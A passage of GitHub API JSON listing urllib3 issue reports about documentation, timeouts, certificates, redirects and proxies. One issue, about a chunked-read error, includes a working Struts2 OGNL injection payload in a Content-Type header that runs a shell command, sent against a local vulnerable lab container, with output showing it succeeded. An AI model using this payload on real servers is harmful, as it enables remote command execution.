reference doc for connection objects ( https://urllib3.readthedocs.io/en/latest/reference/index.html#urllib3.connection.VerifiedHTTPSConnection ) seems a little bit spare on details about the parameters accepted.\r\n\r\nIn particular, I was looking at using `server_hostname`, and I didn't find it anywhere in the reference doc.\r\nI did eventually find it (I assume with the same meaning) documented on [this utility function](https://urllib3.readthedocs.io/en/latest/reference/urllib3.util.html#urllib3.util.ssl_wrap_socket).\r\n\r\nComing to these docs having very rarely needed to work directly with urllib3 (it's usually the transport used by some higher-level library I'm using, like `requests`), it seemed like the docs for the connection object were missing bits. If I were to open a PR adding a line to the docstring for each parameter, would it be welcome? Or are these params meant to be covered elsewhere in the docs?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1881", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1881/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1881/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1881/events", "html_url": "https://github.com/urllib3/urllib3/issues/1881", "id": 626858104, "node_id": "MDU6SXNzdWU2MjY4NTgxMDQ=", "number": 1881, "title": "Expose the raw response headers bytes string ?", "user": {"login": "wesinator", "id": 5124946, "node_id": "MDQ6VXNlcjUxMjQ5NDY=", "avatar_url": "https://avatars2.githubusercontent.com/u/5124946?v=4", "gravatar_id": "", "url": "https://api.github.com/users/wesinator", "html_url": "https://github.com/wesinator", "followers_url": "https://api.github.com/users/wesinator/followers", "following_url": "https://api.github.com/users/wesinator/following{/other_user}", "gists_url": "https://api.github.com/users/wesinator/gists{/gist_id}", "starred_url": "https://api.github.com/users/wesinator/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/wesinator/subscriptions", "organizations_url": "https://api.github.com/users/wesinator/orgs", "repos_url": "https://api.github.com/users/wesinator/repos", "events_url": "https://api.github.com/users/wesinator/events{/privacy}", "received_events_url": "https://api.github.com/users/wesinator/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-05-28T22:32:49Z", "updated_at": "2020-05-30T14:41:19Z", "closed_at": "2020-05-30T14:29:37Z", "author_association": "NONE", "active_lock_reason": null, "body": "Is it possible to expose the raw response header bytes ? \r\n\r\nLike how browser inspectors such as Firefox have a raw headers toggle:\r\n<img width=\"551\" alt=\"image\" src=\"https://user-images.githubusercontent.com/5124946/83198308-e90f6080-a10c-11ea-8e16-72a0668820cf.png\">\r\n\r\nI don't see a way to access this currently under https://urllib3.readthedocs.io/en/latest/reference/index.html#urllib3.response.HTTPResponse, everything is processed into a dict \r\n\r\nTrying [`HTTPResponse.msg`](https://docs.python.org/2/library/httplib.html#httplib.HTTPResponse.msg) gives `None`\r\n\r\n**\"Use case\":** being able to save the original, literal raw unparsed response as returned by the server\r\n\r\nThanks,\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1880", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1880/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1880/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1880/events", "html_url": "https://github.com/urllib3/urllib3/issues/1880", "id": 625222333, "node_id": "MDU6SXNzdWU2MjUyMjIzMzM=", "number": 1880, "title": "Client certificates don't work if the certificate data is in a single-use named pipe/fifo", "user": {"login": "ryanpetrello", "id": 214912, "node_id": "MDQ6VXNlcjIxNDkxMg==", "avatar_url": "https://avatars1.githubusercontent.com/u/214912?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ryanpetrello", "html_url": "https://github.com/ryanpetrello", "followers_url": "https://api.github.com/users/ryanpetrello/followers", "following_url": "https://api.github.com/users/ryanpetrello/following{/other_user}", "gists_url": "https://api.github.com/users/ryanpetrello/gists{/gist_id}", "starred_url": "https://api.github.com/users/ryanpetrello/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ryanpetrello/subscriptions", "organizations_url": "https://api.github.com/users/ryanpetrello/orgs", "repos_url": "https://api.github.com/users/ryanpetrello/repos", "events_url": "https://api.github.com/users/ryanpetrello/events{/privacy}", "received_events_url": "https://api.github.com/users/ryanpetrello/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-05-26T21:50:57Z", "updated_at": "2020-05-30T02:16:01Z", "closed_at": "2020-05-30T02:16:01Z", "author_association": "NONE", "active_lock_reason": null, "body": "https://2.python-requests.org/en/master/user/advanced/#client-side-certificates\r\n\r\nI'm unclear if this is actually an issue with `urllib3` or the underlying `ssl` module, but if your certificate is **actually** a named pipe/fifo instead of a real file, it looks like it's read from multiple times, which results in a hang on subsequent open calls.\r\n\r\nI'm guessing this is really more of an enhancement request than a bug, but I discovered this while working with another library that uses `requests` and passes the pemfile in via a named pipe.  Here's a simple reproduction where you can observe that it hangs forever:\r\n\r\n```python\r\n~/venvs/tmp-62c5a237d7b6777 cat certs.py\r\nimport os\r\nimport threading\r\nimport urllib3\r\n\r\nPATH = 'some.pem'\r\nCERT_DATA = b'''-----BEGIN CERTIFICATE-----\r\nACTUAL-CERT-DATA\r\n-----END CERTIFICATE-----\r\n-----BEGIN PRIVATE KEY-----\r\nACTUAL-KEY-DATA\r\n-----END PRIVATE KEY-----\r\n'''\r\n\r\nif os.path.exists(PATH):\r\n    os.remove(PATH)\r\nos.mkfifo(PATH)\r\nthreading.Thread(\r\n    target=lambda: open(PATH, 'wb').write(CERT_DATA)\r\n).start()\r\n\r\nhttp = urllib3.PoolManager(\r\n    cert_file=PATH,\r\n    cert_reqs='CERT_REQUIRED'\r\n)\r\nprint(http.request('GET', 'https://ansible.com').status)\r\n```\r\n\r\n```shell\r\n~ python3 certs.py\r\n```\r\n\r\n```shell\r\n~ strace -p 28564\r\nstrace: Process 28564 attached\r\nopenat(AT_FDCWD, \"some.pem\", O_RDONLY)  = ? ERESTARTSYS (To be restarted if SA_RESTART is set)\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1879", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1879/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1879/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1879/events", "html_url": "https://github.com/urllib3/urllib3/issues/1879", "id": 624015901, "node_id": "MDU6SXNzdWU2MjQwMTU5MDE=", "number": 1879, "title": "Delayed response from particular host (only Windows, no timeout)", "user": {"login": "hheimbuerger", "id": 159414, "node_id": "MDQ6VXNlcjE1OTQxNA==", "avatar_url": "https://avatars3.githubusercontent.com/u/159414?v=4", "gravatar_id": "", "url": "https://api.github.com/users/hheimbuerger", "html_url": "https://github.com/hheimbuerger", "followers_url": "https://api.github.com/users/hheimbuerger/followers", "following_url": "https://api.github.com/users/hheimbuerger/following{/other_user}", "gists_url": "https://api.github.com/users/hheimbuerger/gists{/gist_id}", "starred_url": "https://api.github.com/users/hheimbuerger/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/hheimbuerger/subscriptions", "organizations_url": "https://api.github.com/users/hheimbuerger/orgs", "repos_url": "https://api.github.com/users/hheimbuerger/repos", "events_url": "https://api.github.com/users/hheimbuerger/events{/privacy}", "received_events_url": "https://api.github.com/users/hheimbuerger/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 9, "created_at": "2020-05-25T03:08:44Z", "updated_at": "2020-07-11T04:11:34Z", "closed_at": "2020-07-11T04:11:34Z", "author_association": "NONE", "active_lock_reason": null, "body": "I'm investigating a stalling issue I have with some downstream libraries of urllib3 around a very particular host: https://amsmediusw-ak.studios.ms/\r\nRequesting a response with urllib3 1.25.9 on Windows takes over 40s, but then ultimately gives the expected result of a 200 and a GUID in the response body:\r\n\r\n    urllib3.PoolManager().request('GET', 'https://amsmediusw-ak.studios.ms/').data\r\n\r\nThe oddity is that various other means of requesting a response from this host are returning virtually immediately, here's a subset of what I've tested:\r\n\r\n* Chrome on Windows (both as a regular page request, as well as with `fetch` in the dev tools: response in under 50ms\r\n* cURL on Linux (via WSL1): fast\r\n* urllib3 on Linux (via Glitch): fast\r\n\r\nHere's the kicker, the response is also immediate if I set a connection timeout! \u2014 even though no timeout is actually triggered, or at least no exception is being raised.\r\n\r\n    >>> timeit.timeit(\"urllib3.PoolManager().request('GET', 'https://amsmediusw-ak.studios.ms/',\r\n                               timeout=urllib3.Timeout(connect=0.1)).data\",\r\n                      setup=\"import urllib3\", number=1)\r\n    0.377045900000212\r\n    >>> timeit.timeit(\"urllib3.PoolManager().request('GET', 'https://amsmediusw-ak.studios.ms/').data\",\r\n                      setup=\"import urllib3\", number=1)\r\n    42.16889579999997\r\n\r\n(Setting a read timeout but no connection timeout has no effect (40+s).)\r\n\r\nReusing the pool manager also means future responses will be immediate. This seems like a major clue to help you understand what's going on here, but I cannot tell.\r\n\r\nThe timing appears to be very stable at between 42.1 and 42.2s, with minor fluctuations making it further unlikely that any routing issues are going on:\r\n\r\n    >>> timeit.repeat(\"urllib3.PoolManager().request('GET', 'https://amsmediusw-ak.studios.ms/').data\", setup=\"import urllib3\", number=1, repeat=5)\r\n    [42.18481859999997, 42.1579299, 42.24814900000001, 42.16824580000002, 42.18917329999999]\r\n\r\nMaking a request via PowerShell (`Invoke-WebRequest https://amsmediusw-ak.studios.ms/ -UseBasicParsing`) is also slow. Indicating that this is rooted somewhere in the Windows sockets implementation, possibly some kind of default connection timeout?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1876", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1876/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1876/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1876/events", "html_url": "https://github.com/urllib3/urllib3/issues/1876", "id": 617435077, "node_id": "MDU6SXNzdWU2MTc0MzUwNzc=", "number": 1876, "title": "ValueError: Timeout value connect was Timeout", "user": {"login": "sithara", "id": 3234964, "node_id": "MDQ6VXNlcjMyMzQ5NjQ=", "avatar_url": "https://avatars2.githubusercontent.com/u/3234964?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sithara", "html_url": "https://github.com/sithara", "followers_url": "https://api.github.com/users/sithara/followers", "following_url": "https://api.github.com/users/sithara/following{/other_user}", "gists_url": "https://api.github.com/users/sithara/gists{/gist_id}", "starred_url": "https://api.github.com/users/sithara/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sithara/subscriptions", "organizations_url": "https://api.github.com/users/sithara/orgs", "repos_url": "https://api.github.com/users/sithara/repos", "events_url": "https://api.github.com/users/sithara/events{/privacy}", "received_events_url": "https://api.github.com/users/sithara/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 7, "created_at": "2020-05-13T13:09:58Z", "updated_at": "2020-05-14T14:38:33Z", "closed_at": "2020-05-13T20:31:00Z", "author_association": "NONE", "active_lock_reason": null, "body": "We  have been using docker-compose for running multiple containers. All of a sudden started receiving the below error. There were no updates performed on the server box:\r\n\r\n```\r\n[app]# docker-compose ps\r\nTraceback (most recent call last):\r\n  File \"/bin/docker-compose\", line 11, in <module>\r\n    sys.exit(main())\r\n  File \"/usr/lib/python2.7/site-packages/compose/cli/main.py\", line 68, in main\r\n    command()\r\n  File \"/usr/lib/python2.7/site-packages/compose/cli/main.py\", line 118, in perf                                                                             orm_command\r\n    handler(command, command_options)\r\n  File \"/usr/lib/python2.7/site-packages/compose/cli/main.py\", line 601, in ps\r\n    self.project.containers(service_names=options['SERVICE'], stopped=True) +\r\n  File \"/usr/lib/python2.7/site-packages/compose/project.py\", line 498, in conta                                                                             iners\r\n    containers = self._labeled_containers(stopped, one_off)\r\n  File \"/usr/lib/python2.7/site-packages/compose/project.py\", line 489, in _labe                                                                             led_containers\r\n    filters={'label': self.labels(one_off=one_off)})])\r\n  File \"/usr/lib/python2.7/site-packages/docker/api/container.py\", line 189, in                                                                              containers\r\n    res = self._result(self._get(u, params=params), True)\r\n  File \"/usr/lib/python2.7/site-packages/docker/utils/decorators.py\", line 47, i                                                                             n inner\r\n    return f(self, *args, **kwargs)\r\n  File \"/usr/lib/python2.7/site-packages/docker/api/client.py\", line 183, in _ge                                                                             t\r\n    return self.get(url, **self._set_request_timeout(kwargs))\r\n  File \"/usr/lib/python2.7/site-packages/requests/sessions.py\", line 498, in get\r\n    return self.request('GET', url, **kwargs)\r\n  File \"/usr/lib/python2.7/site-packages/requests/sessions.py\", line 486, in req                                                                             uest\r\n    resp = self.send(prep, **send_kwargs)\r\n  File \"/usr/lib/python2.7/site-packages/requests/sessions.py\", line 598, in sen                                                                             d\r\n    r = adapter.send(request, **kwargs)\r\n  File \"/usr/lib/python2.7/site-packages/requests/adapters.py\", line 370, in sen                                                                             d\r\n    timeout=timeout\r\n  File \"/usr/lib/python2.7/site-packages/requests/packages/urllib3/connectionpoo                                                                             l.py\", line 582, in urlopen\r\n    timeout_obj = self._get_timeout(timeout)\r\n  File \"/usr/lib/python2.7/site-packages/requests/packages/urllib3/connectionpoo                                                                             l.py\", line 309, in _get_timeout\r\n    return Timeout.from_float(timeout)\r\n  File \"/usr/lib/python2.7/site-packages/requests/packages/urllib3/util/timeout.                                                                             py\", line 154, in from_float\r\n    return Timeout(read=timeout, connect=timeout)\r\n  File \"/usr/lib/python2.7/site-packages/requests/packages/urllib3/util/timeout.                                                                             py\", line 97, in __init__\r\n    self._connect = self._validate_timeout(connect, 'connect')\r\n  File \"/usr/lib/python2.7/site-packages/requests/packages/urllib3/util/timeout.                                                                             py\", line 127, in _validate_timeout\r\n    \"int or float.\" % (name, value))\r\nValueError: Timeout value connect was Timeout(connect=60, read=60, total=None),                                                                              but it must be an int or float.\r\n```\r\nHere's my `pip list`\r\n\r\n```\r\npip list\r\nDEPRECATION: The default format will switch to columns in the future. You can use --format=(legacy|columns) (or define a format=(legacy|columns) in your pip.conf under the [list] section) to disable this warning.\r\nawscli (1.11.92)\r\nbackports.ssl-match-hostname (3.5.0.1)\r\nbotocore (1.5.55)\r\ncached-property (1.3.0)\r\ncffi (1.6.0)\r\nchardet (2.2.1)\r\ncolorama (0.3.7)\r\nconfigobj (4.7.2)\r\nconfigshell-fb (1.1.25)\r\ncryptography (1.7.2)\r\ncustodia (0.3.1)\r\ndecorator (3.4.0)\r\ndnspython (1.12.0)\r\ndocker (2.3.0)\r\ndocker-compose (1.13.0)\r\ndocker-pycreds (0.2.1)\r\ndockerpty (0.4.1)\r\ndocopt (0.6.2)\r\ndocutils (0.13.1)\r\nenum34 (1.0.4)\r\nethtool (0.8)\r\nfunctools32 (3.2.3-2)\r\nfutures (3.1.1)\r\ngssapi (1.2.0)\r\nidna (2.4)\r\niniparse (0.4)\r\niotop (0.6)\r\nipaclient (4.6.5)\r\nipaddress (1.0.16)\r\nipalib (4.6.5)\r\nipaplatform (4.6.5)\r\nipapython (4.6.5)\r\nIPy (0.75)\r\njavapackages (1.0.0)\r\njmespath (0.9.2)\r\njsonschema (2.6.0)\r\njwcrypto (0.4.2)\r\nkitchen (1.1.1)\r\nkmod (0.1)\r\nlangtable (0.0.31)\r\nlxml (3.2.1)\r\nMagic-file-extensions (0.2)\r\nMySQL-python (1.2.5)\r\nnetaddr (0.7.5)\r\nnetifaces (0.10.4)\r\nnose (1.3.7)\r\nnumpy (1.7.1)\r\npcp (4.1)\r\nperf (0.1)\r\npip (9.0.1)\r\nply (3.4)\r\npolicycoreutils-default-encoding (0.1)\r\npsycopg2 (2.5.1)\r\npyasn1 (0.1.9)\r\npyasn1-modules (0.0.8)\r\npycparser (2.14)\r\npycurl (7.19.0)\r\npygobject (3.22.0)\r\npygpgme (0.3)\r\npyinotify (0.9.4)\r\npyliblzma (0.5.3)\r\npyOpenSSL (0.13.1)\r\npyparsing (1.5.6)\r\npython-augeas (0.5.0)\r\npython-dateutil (2.6.0)\r\npython-dmidecode (3.10.13)\r\npython-ldap (2.4.15)\r\npython-linux-procfs (0.4.9)\r\npython-nss (0.16.0)\r\npython-yubico (1.2.3)\r\npyudev (0.15)\r\npyusb (1.0.0b1)\r\npyxattr (0.5.1)\r\nPyYAML (3.12)\r\nqrcode (5.0.1)\r\nrequests (2.11.1)\r\nrsa (3.4.2)\r\nrtslib-fb (2.1.69)\r\ns3transfer (0.1.10)\r\nschedutils (0.4)\r\nseobject (0.1)\r\nsepolicy (1.1)\r\nsetuptools (0.9.8)\r\nsix (1.9.0)\r\nslip (0.4.0)\r\nslip.dbus (0.4.0)\r\nSSSDConfig (1.16.4)\r\nsubscription-manager (1.24.13)\r\nsyspurpose (1.24.13)\r\ntargetcli-fb (2.1.fb49)\r\ntexttable (0.8.8)\r\nurlgrabber (3.10)\r\nurllib3 (1.10.2)\r\nurwid (1.1.1)\r\nvirtualenv (15.1.0)\r\nwebsocket-client (0.40.0)\r\nwheel (0.29.0)\r\nyum-langpacks (0.4.2)\r\nyum-metadata-parser (1.1.4)\r\nYou are using pip version 9.0.1, however version 20.1 is available.\r\nYou should consider upgrading via the 'pip install --upgrade pip' command.\r\n```\r\nKindly request help on fixing this ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1874", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1874/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1874/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1874/events", "html_url": "https://github.com/urllib3/urllib3/issues/1874", "id": 616378961, "node_id": "MDU6SXNzdWU2MTYzNzg5NjE=", "number": 1874, "title": "http.client.IncompleteRead: IncompleteRead(0 bytes read)", "user": {"login": "boy-hack", "id": 18695984, "node_id": "MDQ6VXNlcjE4Njk1OTg0", "avatar_url": "https://avatars0.githubusercontent.com/u/18695984?v=4", "gravatar_id": "", "url": "https://api.github.com/users/boy-hack", "html_url": "https://github.com/boy-hack", "followers_url": "https://api.github.com/users/boy-hack/followers", "following_url": "https://api.github.com/users/boy-hack/following{/other_user}", "gists_url": "https://api.github.com/users/boy-hack/gists{/gist_id}", "starred_url": "https://api.github.com/users/boy-hack/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/boy-hack/subscriptions", "organizations_url": "https://api.github.com/users/boy-hack/orgs", "repos_url": "https://api.github.com/users/boy-hack/repos", "events_url": "https://api.github.com/users/boy-hack/events{/privacy}", "received_events_url": "https://api.github.com/users/boy-hack/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-05-12T05:49:34Z", "updated_at": "2020-05-24T17:08:41Z", "closed_at": "2020-05-24T17:08:41Z", "author_association": "NONE", "active_lock_reason": null, "body": "related https://github.com/urllib3/urllib3/pull/1873\r\nMy recurring environment is\r\n```\r\ndocker pull medicean/vulapps:s_struts2_s2-032\r\ndocker run -d -p 8080:8080 medicean/vulapps:s_struts2_s2-032\r\n```\r\n\r\n```python\r\nimport urllib3\r\n\r\nhttp = urllib3.PoolManager()\r\nr = http.request('POST', 'http://127.0.0.1:8080', headers={\r\n    \"Content-Type\": \"hah-multipart/form-data %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls -alh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\"})\r\nprint(r.data)\r\n```\r\nIt will raise \r\n```python\r\nTraceback (most recent call last):\r\n  File \"/usr/local/Cellar/python/3.7.5/Frameworks/Python.framework/Versions/3.7/lib/python3.7/http/client.py\", line 554, in _get_chunk_left\r\n    chunk_left = self._read_next_chunk_size()\r\n  File \"/usr/local/Cellar/python/3.7.5/Frameworks/Python.framework/Versions/3.7/lib/python3.7/http/client.py\", line 521, in _read_next_chunk_size\r\n    return int(line, 16)\r\nValueError: invalid literal for int() with base 16: b''\r\n\r\nDuring handling of the above exception, another exception occurred:\r\n\r\nTraceback (most recent call last):\r\n  File \"/usr/local/Cellar/python/3.7.5/Frameworks/Python.framework/Versions/3.7/lib/python3.7/http/client.py\", line 571, in _readall_chunked\r\n    chunk_left = self._get_chunk_left()\r\n  File \"/usr/local/Cellar/python/3.7.5/Frameworks/Python.framework/Versions/3.7/lib/python3.7/http/client.py\", line 556, in _get_chunk_left\r\n    raise IncompleteRead(b'')\r\nhttp.client.IncompleteRead: IncompleteRead(0 bytes read)\r\n```\r\n\r\nUsing a socket request, it will return the following\r\n```python\r\nimport socket\r\n\r\np = b'''GET / HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: close\r\nContent-Type: hah-multipart/form-data %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls -alh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\r\n\r\n\r\n'''.replace(b'\\n', b'\\r\\n')\r\n\r\nwith socket.create_connection(('127.0.0.1', '8080'), timeout=5) as conn:\r\n    conn.send(p)\r\n    print(conn.recv(10240))\r\n```\r\nit return\r\n```\r\nb'HTTP/1.1 200 OK\\r\\nServer: Apache-Coyote/1.1\\r\\nTransfer-Encoding: chunked\\r\\nDate: Tue, 12 May 2020 03:39:06 GMT\\r\\nConnection: close\\r\\n\\r\\n9a\\r\\ntotal 12K\\ndrwxrwxrwt 1 root root 4.0K Jul  8  2016 .\\ndrwxr-xr-x 1 root root 4.0K May 11 08:36 ..\\ndrwxr-xr-x 1 root root 4.0K May 11 08:36 hsperfdata_root\\n\\r\\n'\r\n```\r\nIt could be an error caused by urllib3's processing of the last `\\n\\r\\n` character.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1871", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1871/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1871/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1871/events", "html_url": "https://github.com/urllib3/urllib3/issues/1871", "id": 612675753, "node_id": "MDU6SXNzdWU2MTI2NzU3NTM=", "number": 1871, "title": "KeyError can be triggered by a server", "user": {"login": "hannob", "id": 990588, "node_id": "MDQ6VXNlcjk5MDU4OA==", "avatar_url": "https://avatars1.githubusercontent.com/u/990588?v=4", "gravatar_id": "", "url": "https://api.github.com/users/hannob", "html_url": "https://github.com/hannob", "followers_url": "https://api.github.com/users/hannob/followers", "following_url": "https://api.github.com/users/hannob/following{/other_user}", "gists_url": "https://api.github.com/users/hannob/gists{/gist_id}", "starred_url": "https://api.github.com/users/hannob/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/hannob/subscriptions", "organizations_url": "https://api.github.com/users/hannob/orgs", "repos_url": "https://api.github.com/users/hannob/repos", "events_url": "https://api.github.com/users/hannob/events{/privacy}", "received_events_url": "https://api.github.com/users/hannob/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2020-05-05T15:06:12Z", "updated_at": "2020-06-30T05:14:14Z", "closed_at": "2020-06-30T05:14:14Z", "author_association": "NONE", "active_lock_reason": null, "body": "I noticed a behavior in urllib3 where a server can trigger an unexpected KeyError exception.\r\n\r\nThis happens if a server causes a redirect to a protocol that is not http or https (can also be a bogus protocol).\r\n\r\nTo reproduce you need a server that creates a simple redirect, e.g. with a python CGI something like this:\r\n```\r\n#!/usr/bin/python3\r\nprint(\"location: a://b\")\r\nprint(\"\")\r\n```\r\n\r\nNow do a request with urllib3's poolmanager, e.g.:\r\n```\r\nimport urllib3\r\npool = urllib3.PoolManager()\r\ntry:\r\n    r = pool.request(\"GET\", 'http://localhost/)\r\nexcept (ConnectionRefusedError, ConnectionResetError,\r\n        urllib3.exceptions.HTTPError):\r\n    pass\r\n```\r\n\r\nA similar issue has already been reported in issue #872. However it was closed without a fix and the discussion there indicates that this was due to the fact that one expects programmers not to provide invalid input.\r\nThis scenario here is different as the bug can be triggered by a server, which is not necessarily under control or trusted by the application. Causing a KeyError is a very unexpected thing for an HTTP library, so I can imagine that there are situations where this can be used to crash applications with an unexpected / unhandled exception.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1870", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1870/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1870/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1870/events", "html_url": "https://github.com/urllib3/urllib3/issues/1870", "id": 612621589, "node_id": "MDU6SXNzdWU2MTI2MjE1ODk=", "number": 1870, "title": "URL containing backslashes in username/password now failing DNS lookup in 1.25.9", "user": {"login": "lmocsi", "id": 64848347, "node_id": "MDQ6VXNlcjY0ODQ4MzQ3", "avatar_url": "https://avatars0.githubusercontent.com/u/64848347?v=4", "gravatar_id": "", "url": "https://api.github.com/users/lmocsi", "html_url": "https://github.com/lmocsi", "followers_url": "https://api.github.com/users/lmocsi/followers", "following_url": "https://api.github.com/users/lmocsi/following{/other_user}", "gists_url": "https://api.github.com/users/lmocsi/gists{/gist_id}", "starred_url": "https://api.github.com/users/lmocsi/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/lmocsi/subscriptions", "organizations_url": "https://api.github.com/users/lmocsi/orgs", "repos_url": "https://api.github.com/users/lmocsi/repos", "events_url": "https://api.github.com/users/lmocsi/events{/privacy}", "received_events_url": "https://api.github.com/users/lmocsi/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2020-05-05T13:54:22Z", "updated_at": "2020-05-05T15:36:14Z", "closed_at": "2020-05-05T15:36:14Z", "author_association": "NONE", "active_lock_reason": null, "body": "Working from behind a proxy server was fine with urllib3 version 1.25.8.\r\nAfter upgrading to version 1.25.9, the package fails before reaching the proxy server with the following error:\r\nTraceback (most recent call last):\r\n  File \"c:\\Anaconda3\\lib\\site-packages\\urllib3\\connection.py\", line 160, in _new_conn\r\n    (self._dns_host, self.port), self.timeout, **extra_kw\r\n  File \"c:\\Anaconda3\\lib\\site-packages\\urllib3\\util\\connection.py\", line 61, in create_connection\r\n    for res in socket.getaddrinfo(host, port, family, socket.SOCK_STREAM):\r\n  File \"c:\\Anaconda3\\lib\\socket.py\", line 743, in getaddrinfo\r\n    for res in _socket.getaddrinfo(host, port, family, type, proto, flags):\r\nsocket.gaierror: [Errno 11001] getaddrinfo failed\r\n\r\nWhat I do is connecting to a https API through an authenticated proxy server connection.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1865", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1865/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1865/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1865/events", "html_url": "https://github.com/urllib3/urllib3/issues/1865", "id": 607013551, "node_id": "MDU6SXNzdWU2MDcwMTM1NTE=", "number": 1865, "title": "Max retries exceeded with url: / (Caused by SSLError", "user": {"login": "WayneZeng", "id": 16344608, "node_id": "MDQ6VXNlcjE2MzQ0NjA4", "avatar_url": "https://avatars2.githubusercontent.com/u/16344608?v=4", "gravatar_id": "", "url": "https://api.github.com/users/WayneZeng", "html_url": "https://github.com/WayneZeng", "followers_url": "https://api.github.com/users/WayneZeng/followers", "following_url": 